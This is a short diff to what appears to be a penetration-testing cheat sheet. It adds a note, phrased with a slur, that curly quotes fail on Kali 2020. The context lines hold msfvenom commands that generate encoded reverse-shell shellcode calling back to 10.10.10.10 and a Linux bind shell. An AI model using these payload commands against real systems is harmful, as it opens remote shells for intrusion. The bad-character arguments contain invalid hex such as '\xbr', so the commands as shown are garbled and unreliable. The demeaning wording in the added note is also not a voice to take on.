@@ -1035,6 +1035,7 @@ jmp eax
 ```
 
 ### Generating Shellcode
+NOTE: THE DOUBLE QUOTES WILL NOT WORK ON KALI 2020, IT IS RETARDED
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`
 
 `msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f python -e x86/shikata_ga_nai -b “\x00\xbr\xuh”`
